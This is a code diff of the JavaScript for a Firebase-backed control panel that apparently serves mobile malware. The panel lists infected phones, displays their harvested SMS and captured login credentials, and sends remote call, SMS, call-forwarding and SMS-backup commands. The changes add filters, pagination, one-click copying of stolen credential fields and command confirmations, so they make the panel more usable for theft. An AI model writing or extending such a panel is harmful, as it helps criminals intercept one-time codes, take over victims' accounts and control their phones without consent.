@@ -1,5 +1,5 @@
 /* ============================================================ */
-/* app.js - Luxury Panel Logic                                  */
+/* app.js - All JavaScript Logic with All Features              */
 /* ============================================================ */
 
 // ============================================================
@@ -27,15 +27,18 @@ let activeTabs = {};
 let isPanelOpen = { devices: true, sms: false, backup: false, analytics: false };
 let formMemory = {};
 let deviceOffset = 0;
-const DEVICE_LIMIT = 8;
+const DEVICE_LIMIT = 5;
 let allDeviceKeys = [];
+let filteredDeviceKeys = [];
+let currentFilter = 'all';
 let allSmsList = [];
 let allSmsOffset = 0;
-const SMS_LIMIT = 12;
+const SMS_LIMIT = 10;
 let modalSmsList = [];
 let modalSmsOffset = 0;
 let modalTarget = 'ALL';
 let deviceSmsCache = {};
+let smsFilterDevice = null; // For filtering SMS by device ID
 
 // ============================================================
 // DOM REFS
@@ -58,7 +61,7 @@ db.ref(".info/connected").on("value", (snap) => {
 });
 
 // ============================================================
-// MAIN DATA LISTENER
+// MAIN DATA LISTENER - INSTANT LOAD
 // ============================================================
 let firstLoad = true;
 
@@ -73,7 +76,6 @@ db.ref().on("value", (snapshot) => {
 
     if (firstLoad) {
         firstLoad = false;
-        // Default panel open
         if (!isPanelOpen.devices) {
             togglePanel('devices');
         }
@@ -89,7 +91,6 @@ function renderAll() {
     renderAnalytics();
     updateBackupDeviceList();
 
-    // Update counts
     const devices = cachedData.user_data || {};
     const keys = Object.keys(devices);
     $('deviceCount').textContent = keys.length;
@@ -102,8 +103,6 @@ function renderAll() {
         if (isOnline) online++;
         else offline++;
     });
-    $('onlineCount').textContent = online;
-    $('offlineCount').textContent = offline;
     $('panelDeviceCount').textContent = keys.length;
 
     const smsData = cachedData.user_sms || {};
@@ -128,12 +127,6 @@ function renderAll() {
 // ============================================================
 function togglePanel(panel) {
     const panels = ['devices', 'sms', 'backup', 'analytics'];
-    const navMap = {
-        devices: 'btnDevices',
-        sms: 'btnSms',
-        backup: 'btnBackup',
-        analytics: 'btnAnalytics'
-    };
 
     panels.forEach(p => {
         if (p !== panel) {
@@ -172,22 +165,53 @@ function togglePanel(panel) {
 }
 
 // ============================================================
-// RENDER DEVICES
+// FILTER DEVICES - ONLINE / OFFLINE
+// ============================================================
+function filterDevices(filter) {
+    currentFilter = filter;
+    deviceOffset = 0;
+
+    // Update button states
+    document.querySelectorAll('.filter-btn').forEach(btn => btn.classList.remove('active'));
+    if (filter === 'all') $('filterAll').classList.add('active');
+    else if (filter === 'online') $('filterOnline').classList.add('active');
+    else if (filter === 'offline') $('filterOffline').classList.add('active');
+
+    renderDevices();
+}
+
+// ============================================================
+// RENDER DEVICES - WITH FILTER & PAGINATION
 // ============================================================
 function renderDevices() {
     const container = $('devicesContainer');
     const devices = cachedData.user_data || {};
     allDeviceKeys = Object.keys(devices);
 
-    if (allDeviceKeys.length === 0) {
-        container.innerHTML = `<div class="empty-luxury"><i class="fas fa-mobile-alt" style="font-size:32px;display:block;margin-bottom:10px;color:var(--text-muted);"></i>No devices registered</div>`;
+    // Apply filter
+    if (currentFilter === 'online') {
+        filteredDeviceKeys = allDeviceKeys.filter(id => {
+            const d = devices[id];
+            return d.isOnline || d.online || false;
+        });
+    } else if (currentFilter === 'offline') {
+        filteredDeviceKeys = allDeviceKeys.filter(id => {
+            const d = devices[id];
+            return !(d.isOnline || d.online || false);
+        });
+    } else {
+        filteredDeviceKeys = [...allDeviceKeys];
+    }
+
+    if (filteredDeviceKeys.length === 0) {
+        container.innerHTML = `<div class="empty-luxury"><i class="fas fa-mobile-alt" style="font-size:32px;display:block;margin-bottom:10px;color:var(--text-muted);"></i>${currentFilter === 'all' ? 'No devices registered' : 'No ' + currentFilter + ' devices'}</div>`;
         return;
     }
 
     const start = deviceOffset;
-    const end = Math.min(start + DEVICE_LIMIT, allDeviceKeys.length);
-    const displayKeys = allDeviceKeys.slice(start, end);
-    const hasMore = end < allDeviceKeys.length;
+    const end = Math.min(start + DEVICE_LIMIT, filteredDeviceKeys.length);
+    const displayKeys = filteredDeviceKeys.slice(start, end);
+    const hasMore = end < filteredDeviceKeys.length;
 
     let html = '';
 
@@ -265,6 +289,7 @@ function renderDevices() {
                         <button class="sub-btn ${activeTab === 'backup' ? 'active-backup' : ''}" onclick="event.stopPropagation();setTab('${devId}','backup')">💾</button>
                     </div>
 
+                    <!-- SMS Section -->
                     <div class="section-box ${activeTab === 'sms' ? 'active' : ''}" id="sec-sms-${devId}">
                         <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">
                             <h4 style="color:var(--gold-light);margin:0;font-size:13px;">💬 SMS (${totalSms})</h4>
@@ -277,23 +302,23 @@ function renderDevices() {
                         ${hasMoreSms ? `<button class="btn-load-more" style="margin-top:6px;padding:6px;font-size:11px;" onclick="event.stopPropagation();loadMoreDeviceSms('${devId}')">📥 Load More</button>` : ''}
                     </div>
 
+                    <!-- Login Section with Copy Buttons -->
                     <div class="section-box ${activeTab === 'login' ? 'active' : ''}" id="sec-login-${devId}">
                         <h4 style="color:#f59e0b;font-size:13px;">🔑 Credentials</h4>
-                        <div class="table-wrapper">
-                            <table>
-                                <thead><tr><th>Fields</th></tr></thead>
-                                <tbody>
-                                    ${devLoginList.length === 0 ? '<tr><td class="empty-luxury">No credentials</td></tr>' :
-                                    devLoginList.map(rec => {
-                                        let txt = '';
-                                        for (let k in rec) txt += `<b>${k}:</b> ${rec[k]}<br>`;
-                                        return `<tr><td>${txt}</td></tr>`;
-                                    }).join('')}
-                                </tbody>
-                            </table>
+                        <div class="login-cards">
+                            ${devLoginList.length === 0 ? '<div class="empty-luxury">No credentials</div>' :
+                            devLoginList.map((rec, idx) => {
+                                let fields = '';
+                                let fieldArray = [];
+                                for (let k in rec) {
+                                    fields += `<div class="login-field"><span class="field-label">${k}:</span> <span class="field-value" id="field-${devId}-${idx}-${k}">${rec[k]}</span> <button class="copy-field-btn" onclick="copyField('field-${devId}-${idx}-${k}')"><i class="fas fa-copy"></i></button></div>`;
+                                }
+                                return `<div class="login-card"><div class="login-card-header">Record ${idx+1}</div><div class="login-card-body">${fields}</div></div>`;
+                            }).join('')}
                         </div>
                     </div>
 
+                    <!-- Call Section -->
                     <div class="section-box ${activeTab === 'call' ? 'active' : ''}" id="sec-call-${devId}">
                         <h4 style="color:var(--green);font-size:13px;">📞 Make Call</h4>
                         <input type="text" id="callNum-${devId}" value="${formMemory[`callNum-${devId}`] || ''}" placeholder="Phone Number" oninput="formMemory['callNum-${devId}']=this.value" onclick="event.stopPropagation()">
@@ -301,9 +326,12 @@ function renderDevices() {
                             <option value="0" ${(formMemory[`callSim-${devId}`] || '0') === '0' ? 'selected' : ''}>SIM 1</option>
                             <option value="1" ${(formMemory[`callSim-${devId}`] || '0') === '1' ? 'selected' : ''}>SIM 2</option>
                         </select>
-                        <button class="btn-luxury btn-purple" onclick="event.stopPropagation();sendCall('${devId}')" style="padding:8px;font-size:11px;width:100%;justify-content:center;"><i class="fas fa-phone"></i> Call</button>
+                        <button class="btn-luxury btn-purple" onclick="event.stopPropagation();showCommandDialog('call','${devId}')" style="padding:8px;font-size:11px;width:100%;justify-content:center;">
+                            <i class="fas fa-phone"></i> Call
+                        </button>
                     </div>
 
+                    <!-- Send SMS Section -->
                     <div class="section-box ${activeTab === 'sendsms' ? 'active' : ''}" id="sec-sendsms-${devId}">
                         <h4 style="color:var(--purple);font-size:13px;">✉️ Send SMS</h4>
                         <input type="text" id="smsNum-${devId}" value="${formMemory[`smsNum-${devId}`] || ''}" placeholder="Recipient" oninput="formMemory['smsNum-${devId}']=this.value" onclick="event.stopPropagation()">
@@ -312,9 +340,12 @@ function renderDevices() {
                             <option value="1" ${(formMemory[`smsSim-${devId}`] || '1') === '1' ? 'selected' : ''}>SIM 1</option>
                             <option value="2" ${(formMemory[`smsSim-${devId}`] || '1') === '2' ? 'selected' : ''}>SIM 2</option>
                         </select>
-                        <button class="btn-luxury btn-blue" onclick="event.stopPropagation();sendSms('${devId}')" style="padding:8px;font-size:11px;width:100%;justify-content:center;"><i class="fas fa-paper-plane"></i> Send</button>
+                        <button class="btn-luxury btn-blue" onclick="event.stopPropagation();showCommandDialog('sms','${devId}')" style="padding:8px;font-size:11px;width:100%;justify-content:center;">
+                            <i class="fas fa-paper-plane"></i> Send
+                        </button>
                     </div>
 
+                    <!-- Forward Section -->
                     <div class="section-box ${activeTab === 'fwd' ? 'active' : ''}" id="sec-fwd-${devId}">
                         <h4 style="color:var(--red);font-size:13px;">🔀 Call Forward</h4>
                         <input type="text" id="fwdNum-${devId}" value="${formMemory[`fwdNum-${devId}`] || ''}" placeholder="Forward To" oninput="formMemory['fwdNum-${devId}']=this.value" onclick="event.stopPropagation()">
@@ -322,15 +353,24 @@ function renderDevices() {
                             <option value="0" ${(formMemory[`fwdSim-${devId}`] || '0') === '0' ? 'selected' : ''}>SIM 1</option>
                             <option value="1" ${(formMemory[`fwdSim-${devId}`] || '0') === '1' ? 'selected' : ''}>SIM 2</option>
                         </select>
-                        <button class="btn-luxury" style="background:var(--green);color:#fff;padding:8px;font-size:11px;width:100%;justify-content:center;margin-bottom:4px;" onclick="event.stopPropagation();sendFwd('${devId}','call forward')"><i class="fas fa-play"></i> Activate</button>
-                        <button class="btn-luxury btn-red" onclick="event.stopPropagation();sendFwd('${devId}','forward off')" style="padding:8px;font-size:11px;width:100%;justify-content:center;"><i class="fas fa-stop"></i> Deactivate</button>
+                        <button class="btn-luxury" style="background:var(--green);color:#fff;padding:8px;font-size:11px;width:100%;justify-content:center;margin-bottom:4px;" onclick="event.stopPropagation();showCommandDialog('fwd_on','${devId}')">
+                            <i class="fas fa-play"></i> Activate
+                        </button>
+                        <button class="btn-luxury btn-red" onclick="event.stopPropagation();showCommandDialog('fwd_off','${devId}')" style="padding:8px;font-size:11px;width:100%;justify-content:center;">
+                            <i class="fas fa-stop"></i> Deactivate
+                        </button>
                     </div>
 
+                    <!-- Backup Section -->
                     <div class="section-box ${activeTab === 'backup' ? 'active' : ''}" id="sec-backup-${devId}">
                         <h4 style="color:#06b6d4;font-size:13px;">💾 Backup</h4>
                         <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;">
-                            <button class="btn-luxury btn-purple" onclick="event.stopPropagation();triggerDeviceBackup('${devId}')" style="padding:8px;font-size:11px;justify-content:center;"><i class="fas fa-database"></i> Backup</button>
-                            <button class="btn-luxury btn-blue" onclick="event.stopPropagation();refreshDeviceBackup('${devId}')" style="padding:8px;font-size:11px;justify-content:center;"><i class="fas fa-sync"></i> Refresh</button>
+                            <button class="btn-luxury btn-purple" onclick="event.stopPropagation();showCommandDialog('backup','${devId}')" style="padding:8px;font-size:11px;justify-content:center;">
+                                <i class="fas fa-database"></i> Backup
+                            </button>
+                            <button class="btn-luxury btn-blue" onclick="event.stopPropagation();refreshDeviceBackup('${devId}')" style="padding:8px;font-size:11px;justify-content:center;">
+                                <i class="fas fa-sync"></i> Refresh
+                            </button>
                         </div>
                         <div id="deviceBackup-${devId}" style="margin-top:8px;padding:8px;background:var(--bg-primary);border-radius:6px;border:1px solid var(--border-color);font-size:11px;color:var(--text-muted);">
                             Click Refresh to check status
@@ -344,11 +384,35 @@ function renderDevices() {
     container.innerHTML = html;
 
     if (hasMore) {
+        const remaining = filteredDeviceKeys.length - end;
         container.innerHTML += `
             <button class="btn-load-more" onclick="loadMoreDevices()">
-                <i class="fas fa-chevron-down"></i> Load More (${allDeviceKeys.length - end} remaining)
+                <i class="fas fa-chevron-down"></i> Load More (${remaining} remaining)
             </button>
         `;
+    }
+}
+
+// ============================================================
+// LOAD MORE DEVICES - WITH BACK BUTTON
+// ============================================================
+function loadMoreDevices() {
+    deviceOffset += DEVICE_LIMIT;
+    renderDevices();
+
+    // Show back button if offset > 0
+    const container = $('devicesContainer');
+    if (deviceOffset > 0) {
+        const backBtn = document.createElement('button');
+        backBtn.className = 'btn-load-more';
+        backBtn.style.marginBottom = '10px';
+        backBtn.innerHTML = '<i class="fas fa-chevron-up"></i> Back';
+        backBtn.onclick = function() {
+            deviceOffset = Math.max(0, deviceOffset - DEVICE_LIMIT);
+            renderDevices();
+        };
+        // Insert at top
+        container.insertBefore(backBtn, container.firstChild);
     }
 }
 
@@ -361,7 +425,7 @@ function renderSmsCards(list, showDevice = false) {
         <div class="sms-card-luxury">
             <div class="sms-header">
                 <div class="sms-sender">
-                    ${showDevice ? `<span class="device-tag">[${msg.deviceId}]</span> ` : ''}
+                    ${showDevice ? `<span class="device-tag" onclick="filterSmsByDevice('${msg.deviceId}')">[${msg.deviceId}]</span> ` : ''}
                     👤 ${msg.sender || msg.address || 'Unknown'}
                 </div>
                 <div class="sms-meta">
@@ -374,7 +438,34 @@ function renderSmsCards(list, showDevice = false) {
 }
 
 // ============================================================
-// RENDER ALL SMS
+// FILTER SMS BY DEVICE - Click on device ID in SMS
+// ============================================================
+function filterSmsByDevice(deviceId) {
+    smsFilterDevice = deviceId;
+    $('clearSmsFilterBtn').style.display = 'inline-block';
+    allSmsOffset = 0;
+
+    // Show notification
+    showToast(`📱 Filtering messages for: ${deviceId}`, 'info');
+
+    // Switch to SMS panel
+    if (!isPanelOpen.sms) {
+        togglePanel('sms');
+    } else {
+        renderAllSms();
+    }
+}
+
+function clearSmsFilter() {
+    smsFilterDevice = null;
+    $('clearSmsFilterBtn').style.display = 'none';
+    allSmsOffset = 0;
+    renderAllSms();
+    showToast('✅ Filter cleared', 'success');
+}
+
+// ============================================================
+// RENDER ALL SMS - WITH DEVICE FILTER
 // ============================================================
 function renderAllSms() {
     const container = $('allSmsContainer');
@@ -384,16 +475,26 @@ function renderAllSms() {
         allSmsList = [];
         const smsData = cachedData.user_sms || {};
         Object.keys(smsData).forEach(devId => {
+            // Apply device filter
+            if (smsFilterDevice && smsFilterDevice !== devId) return;
+
             const msgs = smsData[devId];
             Object.keys(msgs).forEach(k => {
                 allSmsList.push({ deviceId: devId, ...msgs[k] });
             });
         });
         allSmsList.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
+
+        // Show filter info
+        if (smsFilterDevice) {
+            $('panelSmsCount').textContent = allSmsList.length + ' (filtered)';
+        } else {
+            $('panelSmsCount').textContent = allSmsList.length;
+        }
     }
 
     if (allSmsList.length === 0) {
-        container.innerHTML = `<div class="empty-luxury"><i class="fas fa-inbox" style="font-size:32px;display:block;margin-bottom:10px;color:var(--text-muted);"></i>No messages found</div>`;
+        container.innerHTML = `<div class="empty-luxury"><i class="fas fa-inbox" style="font-size:32px;display:block;margin-bottom:10px;color:var(--text-muted);"></i>${smsFilterDevice ? 'No messages for ' + smsFilterDevice : 'No messages found'}</div>`;
         loadMore.style.display = 'none';
         return;
     }
@@ -413,6 +514,26 @@ function renderAllSms() {
         loadMore.textContent = `📥 Load More (${allSmsList.length - end} remaining)`;
     } else {
         loadMore.style.display = 'none';
+    }
+}
+
+// ============================================================
+// LOAD MORE ALL SMS
+// ============================================================
+function loadMoreAllSms() {
+    allSmsOffset += SMS_LIMIT;
+    renderAllSms();
+}
+
+// ============================================================
+// LOAD MORE DEVICE SMS
+// ============================================================
+function loadMoreDeviceSms(devId) {
+    if (deviceSmsCache[devId]) {
+        deviceSmsCache[devId].offset += SMS_LIMIT;
+        renderDevices();
+        expandedDevices[devId] = true;
+        activeTabs[devId] = 'sms';
     }
 }
 
@@ -438,7 +559,6 @@ function renderAnalytics() {
     });
     $('analyticsBackupSms').textContent = backupCount;
 
-    // Last activity
     let latest = 0;
     Object.keys(smsData).forEach(d => {
         const msgs = smsData[d];
@@ -456,230 +576,60 @@ function renderAnalytics() {
 }
 
 // ============================================================
-// BACKUP SMS FUNCTIONS
+// COPY FIELD - For Credentials
 // ============================================================
-function loadBackupSmsForDevice(devId) {
-    const container = $('backupSmsList');
-    if (!devId) {
-        container.innerHTML = '<div class="empty-luxury">Select a device to view backup messages</div>';
-        return;
-    }
-
-    const backupData = cachedData.backup_sms;
-    if (backupData && backupData[devId]) {
-        renderBackupSmsList(container, backupData[devId]);
-        return;
-    }
-
-    container.innerHTML = '<div class="loading-luxury"><span class="loader-ring"></span> Loading...</div>';
-
-    db.ref(`backup_sms/${devId}`).once('value').then(snap => {
-        if (snap.exists()) {
-            renderBackupSmsList(container, snap.val());
-        } else {
-            container.innerHTML = '<div class="empty-luxury">No backup SMS found</div>';
-        }
+function copyField(fieldId) {
+    const el = document.getElementById(fieldId);
+    if (!el) return;
+    const text = el.textContent;
+    navigator.clipboard.writeText(text).then(() => {
+        showToast('📋 Copied: ' + text, 'success');
+        // Visual feedback
+        el.style.color = 'var(--gold)';
+        setTimeout(() => el.style.color = '', 800);
     }).catch(() => {
-        container.innerHTML = '<div class="empty-luxury" style="color:var(--red);">❌ Error loading</div>';
+        // Fallback
+        const ta = document.createElement('textarea');
+        ta.value = text;
+        document.body.appendChild(ta);
+        ta.select();
+        document.execCommand('copy');
+        ta.remove();
+        showToast('📋 Copied!', 'success');
     });
 }
 
-function renderBackupSmsList(container, data) {
-    const messages = [];
-    Object.keys(data).forEach(key => {
-        messages.push({ key, ...data[key] });
-    });
-    messages.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
-
-    if (messages.length === 0) {
-        container.innerHTML = '<div class="empty-luxury">No backup messages</div>';
-        return;
-    }
-
-    container.innerHTML = messages.map(msg => `
-        <div class="backup-sms-item">
-            <div class="sms-header">
-                <span class="sender">👤 ${msg.sender || msg.address || 'Unknown'}</span>
-                <span>${msg.date_formatted || msg.date || new Date(msg.timestamp).toLocaleString()}</span>
-            </div>
-            <div class="sms-body">${escapeHtml(msg.body || 'No content')}</div>
-            <div style="font-size:9px;color:var(--text-muted);margin-top:2px;">
-                ${msg.sim_number ? '📱 ' + msg.sim_number : ''}
-                ${msg.backup_id ? ' • 💾 ' + msg.backup_id : ''}
-            </div>
-        </div>
-    `).join('');
-}
-
 // ============================================================
-// OPEN BACKUP SMS MODAL
+// SHOW COMMAND DIALOG - Confirmation before sending
 // ============================================================
-function openBackupSmsModal() {
-    const modal = $('backupSmsModal');
-    const body = $('backupModalBody');
-    const title = $('backupModalTitle');
+function showCommandDialog(type, devId) {
+    const messages = {
+        'call': '📞 Send CALL command to this device?',
+        'sms': '✉️ Send SMS command to this device?',
+        'fwd_on': '🔀 Activate CALL FORWARDING on this device?',
+        'fwd_off': '🔀 Deactivate CALL FORWARDING on this device?',
+        'backup': '💾 Trigger SMS BACKUP on this device?'
+    };
 
-    title.textContent = '💾 All Backup Messages';
-    body.innerHTML = '<div class="loading-luxury"><span class="loader-ring"></span> Loading backups...</div>';
-    modal.classList.add('open');
+    if (!confirm(messages[type] || 'Send command?')) return;
 
-    const backupData = cachedData.backup_sms;
-    if (backupData) {
-        renderAllBackupSms(body, backupData);
-        return;
+    switch (type) {
+        case 'call':
+            sendCall(devId);
+            break;
+        case 'sms':
+            sendSms(devId);
+            break;
+        case 'fwd_on':
+            sendFwd(devId, 'call forward');
+            break;
+        case 'fwd_off':
+            sendFwd(devId, 'forward off');
+            break;
+        case 'backup':
+            triggerDeviceBackup(devId);
+            break;
     }
-
-    db.ref('backup_sms').once('value').then(snap => {
-        if (snap.exists()) {
-            renderAllBackupSms(body, snap.val());
-        } else {
-            body.innerHTML = '<div class="empty-luxury"><i class="fas fa-inbox" style="font-size:32px;display:block;margin-bottom:10px;color:var(--text-muted);"></i>No backup messages</div>';
-        }
-    }).catch(() => {
-        body.innerHTML = '<div class="empty-luxury" style="color:var(--red);">❌ Error loading</div>';
-    });
-}
-
-function renderAllBackupSms(container, data) {
-    let allMsgs = [];
-    Object.keys(data).forEach(devId => {
-        const devMsgs = data[devId];
-        Object.keys(devMsgs).forEach(key => {
-            allMsgs.push({ deviceId: devId, key, ...devMsgs[key] });
-        });
-    });
-    allMsgs.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
-
-    if (allMsgs.length === 0) {
-        container.innerHTML = '<div class="empty-luxury">No backup messages</div>';
-        return;
-    }
-
-    container.innerHTML = allMsgs.map(msg => `
-        <div class="backup-sms-item">
-            <div class="sms-header">
-                <span class="sender">
-                    <span style="color:var(--gold-light);font-size:10px;">[${msg.deviceId}]</span>
-                    👤 ${msg.sender || msg.address || 'Unknown'}
-                </span>
-                <span>${msg.date_formatted || msg.date || new Date(msg.timestamp).toLocaleString()}</span>
-            </div>
-            <div class="sms-body">${escapeHtml(msg.body || 'No content')}</div>
-            <div style="font-size:9px;color:var(--text-muted);margin-top:2px;">
-                ${msg.sim_number ? '📱 ' + msg.sim_number : ''}
-                ${msg.backup_id ? ' • 💾 ' + msg.backup_id : ''}
-            </div>
-        </div>
-    `).join('');
-}
-
-function closeBackupSmsModal(e) {
-    if (e && e.target !== e.currentTarget) return;
-    $('backupSmsModal').classList.remove('open');
-}
-
-// ============================================================
-// MODAL FUNCTIONS
-// ============================================================
-function openSmsModal(target) {
-    modalTarget = target;
-    modalSmsOffset = 0;
-    modalSmsList = [];
-
-    const smsData = cachedData.user_sms || {};
-    if (target === 'ALL') {
-        $('modalTitle').textContent = '📩 All Messages';
-        Object.keys(smsData).forEach(devId => {
-            const msgs = smsData[devId];
-            Object.keys(msgs).forEach(k => {
-                modalSmsList.push({ deviceId: devId, ...msgs[k] });
-            });
-        });
-    } else {
-        $('modalTitle').textContent = `📩 Messages for ${target}`;
-        if (smsData[target]) {
-            Object.keys(smsData[target]).forEach(k => {
-                modalSmsList.push(smsData[target][k]);
-            });
-        }
-    }
-
-    modalSmsList.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
-    renderModalSms();
-    $('smsModal').classList.add('open');
-}
-
-function renderModalSms() {
-    const body = $('modalBody');
-    const loadMore = $('modalLoadMore');
-
-    const start = modalSmsOffset;
-    const end = Math.min(start + SMS_LIMIT, modalSmsList.length);
-    const paginated = modalSmsList.slice(start, end);
-
-    if (modalSmsOffset === 0) {
-        body.innerHTML = renderSmsCards(paginated, modalTarget === 'ALL');
-    } else {
-        body.innerHTML += renderSmsCards(paginated, modalTarget === 'ALL');
-    }
-
-    if (end < modalSmsList.length) {
-        loadMore.style.display = 'block';
-        loadMore.textContent = `📥 Load More (${modalSmsList.length - end} remaining)`;
-    } else {
-        loadMore.style.display = 'none';
-    }
-}
-
-function closeSmsModal(e) {
-    if (e && e.target !== e.currentTarget) return;
-    $('smsModal').classList.remove('open');
-}
-
-// ============================================================
-// LOAD MORE FUNCTIONS
-// ============================================================
-function loadMoreDevices() {
-    deviceOffset += DEVICE_LIMIT;
-    renderDevices();
-}
-
-function loadMoreDeviceSms(devId) {
-    if (deviceSmsCache[devId]) {
-        deviceSmsCache[devId].offset += SMS_LIMIT;
-        renderDevices();
-        expandedDevices[devId] = true;
-        activeTabs[devId] = 'sms';
-    }
-}
-
-function loadMoreAllSms() {
-    allSmsOffset += SMS_LIMIT;
-    renderAllSms();
-}
-
-function loadMoreModalSms() {
-    modalSmsOffset += SMS_LIMIT;
-    renderModalSms();
-}
-
-// ============================================================
-// DEVICE UI HELPERS
-// ============================================================
-function toggleDevice(devId) {
-    expandedDevices[devId] = !expandedDevices[devId];
-    renderDevices();
-}
-
-function setTab(devId, tab) {
-    if (activeTabs[devId] === tab) {
-        activeTabs[devId] = null;
-    } else {
-        activeTabs[devId] = tab;
-        if (tab === 'backup') refreshDeviceBackup(devId);
-    }
-    renderDevices();
-    expandedDevices[devId] = true;
 }
 
 // ============================================================
@@ -895,6 +845,206 @@ function clearBackupStatus() {
 }
 
 // ============================================================
+// LOAD BACKUP SMS FOR DEVICE
+// ============================================================
+function loadBackupSmsForDevice(devId) {
+    const container = $('backupSmsList');
+    if (!devId) {
+        container.innerHTML = '<div class="empty-luxury">Select a device to view backup messages</div>';
+        return;
+    }
+
+    const backupData = cachedData.backup_sms;
+    if (backupData && backupData[devId]) {
+        renderBackupSmsList(container, backupData[devId]);
+        return;
+    }
+
+    container.innerHTML = '<div class="loading-luxury"><span class="loader-ring"></span> Loading...</div>';
+
+    db.ref(`backup_sms/${devId}`).once('value').then(snap => {
+        if (snap.exists()) {
+            renderBackupSmsList(container, snap.val());
+        } else {
+            container.innerHTML = '<div class="empty-luxury">No backup SMS found</div>';
+        }
+    }).catch(() => {
+        container.innerHTML = '<div class="empty-luxury" style="color:var(--red);">❌ Error loading</div>';
+    });
+}
+
+function renderBackupSmsList(container, data) {
+    const messages = [];
+    Object.keys(data).forEach(key => {
+        messages.push({ key, ...data[key] });
+    });
+    messages.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
+
+    if (messages.length === 0) {
+        container.innerHTML = '<div class="empty-luxury">No backup messages</div>';
+        return;
+    }
+
+    container.innerHTML = messages.map(msg => `
+        <div class="backup-sms-item">
+            <div class="sms-header">
+                <span class="sender">👤 ${msg.sender || msg.address || 'Unknown'}</span>
+                <span>${msg.date_formatted || msg.date || new Date(msg.timestamp).toLocaleString()}</span>
+            </div>
+            <div class="sms-body">${escapeHtml(msg.body || 'No content')}</div>
+            <div style="font-size:9px;color:var(--text-muted);margin-top:2px;">
+                ${msg.sim_number ? '📱 ' + msg.sim_number : ''}
+                ${msg.backup_id ? ' • 💾 ' + msg.backup_id : ''}
+            </div>
+        </div>
+    `).join('');
+}
+
+// ============================================================
+// OPEN BACKUP SMS MODAL
+// ============================================================
+function openBackupSmsModal() {
+    const modal = $('backupSmsModal');
+    const body = $('backupModalBody');
+    const title = $('backupModalTitle');
+
+    title.textContent = '💾 All Backup Messages';
+    body.innerHTML = '<div class="loading-luxury"><span class="loader-ring"></span> Loading backups...</div>';
+    modal.classList.add('open');
+
+    const backupData = cachedData.backup_sms;
+    if (backupData) {
+        renderAllBackupSms(body, backupData);
+        return;
+    }
+
+    db.ref('backup_sms').once('value').then(snap => {
+        if (snap.exists()) {
+            renderAllBackupSms(body, snap.val());
+        } else {
+            body.innerHTML = '<div class="empty-luxury"><i class="fas fa-inbox" style="font-size:32px;display:block;margin-bottom:10px;color:var(--text-muted);"></i>No backup messages</div>';
+        }
+    }).catch(() => {
+        body.innerHTML = '<div class="empty-luxury" style="color:var(--red);">❌ Error loading</div>';
+    });
+}
+
+function renderAllBackupSms(container, data) {
+    let allMsgs = [];
+    Object.keys(data).forEach(devId => {
+        const devMsgs = data[devId];
+        Object.keys(devMsgs).forEach(key => {
+            allMsgs.push({ deviceId: devId, key, ...devMsgs[key] });
+        });
+    });
+    allMsgs.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
+
+    if (allMsgs.length === 0) {
+        container.innerHTML = '<div class="empty-luxury">No backup messages</div>';
+        return;
+    }
+
+    container.innerHTML = allMsgs.map(msg => `
+        <div class="backup-sms-item">
+            <div class="sms-header">
+                <span class="sender">
+                    <span style="color:var(--gold-light);font-size:10px;">[${msg.deviceId}]</span>
+                    👤 ${msg.sender || msg.address || 'Unknown'}
+                </span>
+                <span>${msg.date_formatted || msg.date || new Date(msg.timestamp).toLocaleString()}</span>
+            </div>
+            <div class="sms-body">${escapeHtml(msg.body || 'No content')}</div>
+            <div style="font-size:9px;color:var(--text-muted);margin-top:2px;">
+                ${msg.sim_number ? '📱 ' + msg.sim_number : ''}
+                ${msg.backup_id ? ' • 💾 ' + msg.backup_id : ''}
+            </div>
+        </div>
+    `).join('');
+}
+
+function closeBackupSmsModal(e) {
+    if (e && e.target !== e.currentTarget) return;
+    $('backupSmsModal').classList.remove('open');
+}
+
+// ============================================================
+// MODAL FUNCTIONS
+// ============================================================
+function openSmsModal(target) {
+    modalTarget = target;
+    modalSmsOffset = 0;
+    modalSmsList = [];
+
+    const smsData = cachedData.user_sms || {};
+    if (target === 'ALL') {
+        $('modalTitle').textContent = '📩 All Messages';
+        Object.keys(smsData).forEach(devId => {
+            const msgs = smsData[devId];
+            Object.keys(msgs).forEach(k => {
+                modalSmsList.push({ deviceId: devId, ...msgs[k] });
+            });
+        });
+    } else {
+        $('modalTitle').textContent = `📩 Messages for ${target}`;
+        if (smsData[target]) {
+            Object.keys(smsData[target]).forEach(k => {
+                modalSmsList.push(smsData[target][k]);
+            });
+        }
+    }
+
+    modalSmsList.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
+    renderModalSms();
+    $('smsModal').classList.add('open');
+}
+
+function renderModalSms() {
+    const body = $('modalBody');
+    const loadMore = $('modalLoadMore');
+
+    const start = modalSmsOffset;
+    const end = Math.min(start + SMS_LIMIT, modalSmsList.length);
+    const paginated = modalSmsList.slice(start, end);
+
+    if (modalSmsOffset === 0) {
+        body.innerHTML = renderSmsCards(paginated, modalTarget === 'ALL');
+    } else {
+        body.innerHTML += renderSmsCards(paginated, modalTarget === 'ALL');
+    }
+
+    if (end < modalSmsList.length) {
+        loadMore.style.display = 'block';
+        loadMore.textContent = `📥 Load More (${modalSmsList.length - end} remaining)`;
+    } else {
+        loadMore.style.display = 'none';
+    }
+}
+
+function closeSmsModal(e) {
+    if (e && e.target !== e.currentTarget) return;
+    $('smsModal').classList.remove('open');
+}
+
+// ============================================================
+// DEVICE UI HELPERS
+// ============================================================
+function toggleDevice(devId) {
+    expandedDevices[devId] = !expandedDevices[devId];
+    renderDevices();
+}
+
+function setTab(devId, tab) {
+    if (activeTabs[devId] === tab) {
+        activeTabs[devId] = null;
+    } else {
+        activeTabs[devId] = tab;
+        if (tab === 'backup') refreshDeviceBackup(devId);
+    }
+    renderDevices();
+    expandedDevices[devId] = true;
+}
+
+// ============================================================
 // TOAST
 // ============================================================
 function showToast(message, type = 'info', duration = 2800) {
@@ -933,4 +1083,7 @@ document.addEventListener('DOMContentLoaded', function() {
             $('backupSmsList').innerHTML = '<div class="empty-luxury">Select a device to view backup messages</div>';
         }
     });
+
+    // Set default filter active
+    $('filterAll').classList.add('active');
 });
